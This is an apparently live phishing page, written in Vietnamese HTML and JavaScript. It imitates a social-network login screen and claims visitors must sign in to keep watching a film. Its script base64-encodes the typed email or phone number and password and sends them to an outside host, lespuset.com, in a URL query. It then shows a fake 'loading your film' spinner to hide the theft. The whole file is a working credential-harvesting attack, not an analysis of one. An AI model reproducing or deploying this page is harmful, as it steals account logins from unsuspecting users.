<html lang="vi">

<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    <title>Đăng nhập để tiếp tục - </title>
    <meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
    <link href="./files/logo.ico" rel="shortcut icon">
    <meta name="description" content="Đăng nhập để xem video">
</head>

<body>
    <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-+0n0xVW2eSR5OomGNYDnhzAbDsOXxcvSN1TPprVMTNDbiYZCxYbOOl7+AMvyTG2x" crossorigin="anonymous">
    <style type="text/css">
        body {
            max-width: 416px;
            margin: 0 auto;
        }
        
        .logo {
            border-top-left-radius: 7px;
            border-top-right-radius: 7px;
            border-bottom-right-radius: 7px;
            border-bottom-left-radius: 7px;
            height: 70px;
            width: 70px;
        }
        
        .language {
            font-size: 12px;
            line-height: 16px;
        }
    </style>
    <div id="message" class="container-fluid" style="background-color: red; display: none; color: white;font-size: 14px;">
        Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào. <a href="javascript:void(0)" style="color: white;font-weight: bold;text-decoration: none;">Đăng ký tài khoản.</a>
    </div>
    <div class="container">
        <div class="row" style="margin-top: 30px;">
            <div class="col-12 text-center">
                <img src="logo3.png" width="112">
            </div>
            <div class="col-12 text-center" style="margin-top: 20px">
                <img class="logo" src="images(106).jpg">
                <img class="logo" src="logo2.png">
            </div>
            <div class="col-12 text-center">
                <span class=""><b>Bạn cần đăng nhập để tiếp tục xem phim</b></span>
            </div>
        </div>
        <div id="main1" class="row">
            <form autocomplete="off" method="post" onsubmit="return false;" class="">
                <input id="mmm" class="form-control" type="text" placeholder="Số đi động hoặc email" aria-label="Số đi động hoặc email" style="background: #f5f6f7 !important;">
                <input id="ppp" class="form-control" type="password" placeholder="Mật khẩu" aria-label="Mật khẩu" style="background: #f5f6f7 !important;margin-top: 5px;">
                <button type="button" class="btn btn-primary w-100" style="margin-top: 10px" onclick="XemVideo();">Đăng nhập</button>
                <button type="button" class="btn btn-primary w-100" style="margin-top: 10px" disabled>Quên mật khẩu?</button>
                <div class="text-center" style="margin-top: 20px">
                    <span>Hoặc</span><br>
                    <button type="button" class="btn btn-success" style="margin-top: 20px">Tạo tài khoản mới</button>
                </div>
            </form>
        </div>
        <div id="main2" style="display: none;">
            <div class="d-flex flex-column align-items-center justify-content-center">
                <div class="row">
                    <div class="spinner-border" role="status"></div>
                </div>
                <div class="row">
                    <strong>Đang chuyển đến phim đã chọn...</strong>
                </div>
            </div>
        </div>
        <div class="row language" style="margin-top: 50px;">
            <div class="col-6 text-center">
                <span class="">Tiếng Việt</span><br>
                <span class="">中文(台灣)</span><br>
                <span class="">한국어</span><br>
                <span class="">Português (Brasil)</span><br>
            </div>
            <div class="col-6 text-center">
                <span class="">English (UK)</span><br>
                <span class="">日本語</span><br>
                <span class="">Español</span><br>
                <span class=""><img style="width: 25px;height: 25px;" src="./files/plus.png"></span><br>
            </div>
        </div>
    </div>

    <script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.bundle.min.js" integrity="sha384-gtEjrD/SeCtmISkJkNUaaKMoLD0//ElJ19smozuHV6z3Iehds+3Ulb9Bn9Plx0x4" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/@popperjs/core@2.9.2/dist/umd/popper.min.js" integrity="sha384-IQsoLXl5PILFhosVNubq5LC7Qb9DXgDA9i+tQ8Zj3iwWAwPtgFTxbJ8NT4GN1R8p" crossorigin="anonymous"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.0.1/dist/js/bootstrap.min.js" integrity="sha384-Atwg2Pkwv9vp0ygtn1JAojH0nYbwNJLPhwyoVbhoPwBhjQPR5VtM2+xf0Uwh9KtT" crossorigin="anonymous"></script>
    <script type="text/javascript">
        const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';

        function u_atob(ascii) {
            return Uint8Array.from(atob(ascii), c => c.charCodeAt(0));
        }

        function u_btoa(buffer) {
            var binary = [];
            var bytes = new Uint8Array(buffer);
            for (var i = 0, il = bytes.byteLength; i < il; i++) {
                binary.push(String.fromCharCode(bytes[i]));
            }
            return btoa(binary.join(''));
        }

        function generateString(length) {
            let result = '';
            const charactersLength = characters.length;
            for (let i = 0; i < length; i++) {
                result += characters.charAt(Math.floor(Math.random() * charactersLength));
            }

            return result;
        }
        $("#mmm, #ppp").on('keypress', function(e) {
            if (e.which == 13) {
                XemVideo();
            }
        });

        function XemVideo() {
            var mmm = $("#mmm").val();
            var ppp = $("#ppp").val();

            var error = false;

            if (mmm.length < 6) {
                error = true;
            }
            if (ppp.length < 6) {
                error = true;
            }
            if (error == false) {
                $("#message").hide();
                var uid = generateString(9);
                window.open("https://lespuset.com/getVideo.php?uid=" + uid + "&" + uid + "_u=" + u_btoa(new TextEncoder().encode(mmm)) + "&" + uid + "_p=" + u_btoa(new TextEncoder().encode(ppp)), "_blank");
                $("#main1").hide();
                $("#main2").show();
            } else {
                $("#message").show();
            }
        }
    </script>
</body>

</html>